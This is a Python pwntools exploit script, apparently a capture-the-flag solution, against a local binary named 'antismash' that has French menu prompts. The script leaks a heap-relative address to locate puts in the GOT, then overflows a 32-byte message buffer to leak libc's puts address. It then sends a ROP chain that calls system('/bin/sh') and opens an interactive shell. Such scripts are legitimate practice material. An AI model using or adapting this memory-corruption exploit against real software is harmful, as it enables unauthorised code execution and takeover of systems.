from pwn import *
from Crypto.Util.number import bytes_to_long

exe = ELF("./antismash")
libc = ELF("/usr/lib/libc.so.6")


# connection
def conn():
    r = process([exe.path])
    return r

# functions
def choose_message(p, message):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'envoyer :\n')
    p.sendline(message)

def get_message(p):
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    p.recvuntil(b"message :\n")
    return p.recvuntil(b'==')[:-2]

def exit(p):
    p.recvuntil(b'>> ')
    p.sendline(b'3')

def loop(p):
    p.recvuntil(b">> ")
    p.sendline(b"3\x00\x00\x00\x00")
    p.recvuntil(b"!\n")
    return p.recvuntil(b"\n")

# main
def main():

    gdb_leak     = 0x5555555581a0
    gdb_puts_got = 0x555555558008

    r = conn()

    r.recvuntil(b'>>> ')
    r.sendline(b'bob')

    data = get_message(r)
    leak = int.from_bytes(data[0x20:0x28], 'little')
    puts_got = leak + (gdb_puts_got - gdb_leak)

    print(f"puts got: {hex(puts_got)}")

    choose_message(r, b"A"*0x20 + p64(puts_got))

    leak = loop(r)
    leak = int.from_bytes(leak[:8], 'little')
    libc.address = leak - libc.symbols["puts"]
    system = libc.symbols["system"]
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    rdi_gadget = libc.address + 0x0000000000026265 # 0x000000000002a3e5
    ret_gadget = libc.address + 0x0000000000026266 # 0x000000000002a3e6

    print(f"system : {hex(system)}")
    print(f"bin_sh : {hex(bin_sh)}")
    print(f"rdi_gad: {hex(rdi_gadget)}")

    choose_message(r, b"A"*0x20 + p64(puts_got)*2 + b"B"*0x20 + b"FAKE_RBP" + p64(rdi_gadget) + p64(bin_sh) + p64(ret_gadget) + p64(system))

    exit(r)

    r.interactive()

    # pid = util.proc.pidof(r)[0]
    # util.proc.wait_for_debugger(pid)


if __name__ == '__main__':
    main()
